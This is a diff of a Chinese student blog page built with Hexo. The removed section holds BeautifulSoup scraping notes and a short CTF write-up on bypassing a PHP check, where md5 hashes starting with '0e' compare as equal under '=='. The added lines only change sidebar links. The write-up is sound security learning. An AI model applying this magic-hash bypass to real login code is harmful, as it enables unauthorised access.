bs.find_all(name_is_exists)</span><br><span class="line">print(t_list)</span><br><span class="line">打印属性中有name的内容</span><br><span class="line"></span><br><span class="line">#kwargs  参数</span><br><span class="line">t_list &#x3D; bs.find_all(id&#x3D;&quot;head&quot;)</span><br><span class="line">for item in t_list: #使输出的内容有序排序</span><br><span class="line">    print(item)</span><br><span class="line">    打印id&#x3D;head 包含的整块内容</span><br><span class="line"></span><br><span class="line">#text 参数</span><br><span class="line">t_list &#x3D; bs.find_all(text &#x3D;re.compile(&quot;\d&quot;)) #应用正则表达式来查找包含特定的文本内容（标签里的字符串）</span><br><span class="line"></span><br><span class="line">for item in t_list:</span><br><span class="line">    print(item)</span><br><span class="line"></span><br><span class="line">#limit 参数</span><br><span class="line">t_list &#x3D; bs.find_all(&quot;a&quot;,limit&#x3D;3)</span><br><span class="line"></span><br><span class="line">for item in t_list:</span><br><span class="line">    print(item)</span><br><span class="line">#limit 限制打印出的内容尾多少个</span><br><span class="line"></span><br><span class="line">#css选择器</span><br><span class="line">t_list &#x3D; bs.select(&#39;title&#39;)  #通过标签来查找</span><br><span class="line"></span><br><span class="line">t_list &#x3D; bs.select(&quot;.mnav&quot;)  #通过类名来查找</span><br><span class="line"></span><br><span class="line">t_list &#x3D; bs.select(&#39;#u1&#39;)   #通过id来查找</span><br><span class="line"></span><br><span class="line">t_list &#x3D; bs.select(&quot;a[class&#x3D;&#39;bri&#39;]&quot;)   #a表示标签 class是属性，通过属性查找</span><br><span class="line"></span><br><span class="line">t_list &#x3D; bs.select(&quot;head &gt; title&quot;)   #通过子标签查找</span><br><span class="line"></span><br><span class="line">for item in t_list:</span><br><span class="line">    print(item)</span><br></pre></td></tr></table></figure>
-
-<p>解析题目：</p>
-<p><a target="_blank" rel="noopener" href="http://47.98.234.232:28068/">http://47.98.234.232:28068</a></p>
-<p>这道题的源码中有三个函数及一个判断条件</p>
-<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/5f8e2a93830626f3fbc73643d9899da.png"></p>
-<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/93a91d7499e4f41038b8bc13594bd27.png"></p>
-<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/b8ab5a846d643a7372e8600d621bf7c.png"></p>
-<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/fe2d4db7aeb9fa45299c58085b19e92.png"></p>
-<p>当$s.$r=&amp;h 时，返回$flag</p>
-<p>又因为rand(),属于系统的数，所以我们不需要计算</p>
-<p>$s.$r=&amp;h 意思即是 当输入的两个数相等时，才能返回flag</p>
-<p>又s是通过md5()加密后的值,因此我们要构造两个md5($s.$r)==md5($h)</p>
-<p>这道题考查我们的是哈希算法</p>
-<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
-<p>所以第一个空以0e开头，后面随意填，第二个空需要查看md5加密后以0e开头的原值即可绕过</p>
-<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/95b2c050be224a6d5f12e04a4941c79.jpg"></p>
-<p><img src="C:\Users\ggken\Desktop\95b2c050be224a6d5f12e04a4941c79.jpg" alt="95b2c050be224a6d5f12e04a4941c79"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://ggken753.github.io/2020/10/28/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/" data-id="ckgtj6eai0000hgv343w140hg" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
@@ -1370,7 +1640,11 @@
       <ul>
         
           <li>
-            <a href="/2020/12/15/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B010/">(no title)</a>
+            <a href="/2020/12/23/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B011/">PHP小知识</a>
+          </li>
+        
+          <li>
+            <a href="/2020/12/18/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B010/">实战</a>
           </li>
         
           <li>
@@ -1383,10 +1657,6 @@
         
           <li>
             <a href="/2020/11/25/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B07/">MISC解题思路</a>
-          </li>
-        
-          <li>
-            <a href="/2020/11/19/%E6%B5%B7%E5%95%B8%E6%9D%AFwp/">海啸杯wp</a>
           </li>
         
       </ul>
